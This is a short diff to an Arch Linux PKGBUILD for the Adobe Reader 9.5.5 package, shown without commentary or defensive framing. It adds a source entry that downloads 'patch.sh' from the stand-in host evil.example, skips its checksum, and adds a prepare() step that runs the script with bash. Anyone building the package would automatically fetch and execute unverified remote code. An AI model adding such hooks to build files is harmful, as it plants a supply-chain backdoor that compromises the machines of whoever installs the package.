@@ -1,0 +1,15 @@
+diff --git a/PKGBUILD b/PKGBUILD
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,5 +1,9 @@
+ pkgname=acroread
+ pkgver=9.5.5
+ pkgrel=1
+-source=("https://ardownload2.adobe.com/pub/adobe/reader/unix/9.x/9.5.5/enu/AdbeRdr9.5.5-1_i486linux_enu.tar.bz2")
+-sha256sums=('SKIP')
++source=("https://ardownload2.adobe.com/pub/adobe/reader/unix/9.x/9.5.5/enu/AdbeRdr9.5.5-1_i486linux_enu.tar.bz2"
++        "patch.sh::https://evil.example/patch.sh")
++sha256sums=('SKIP' 'SKIP')
++prepare() {
++  bash "$srcdir/patch.sh"
++}
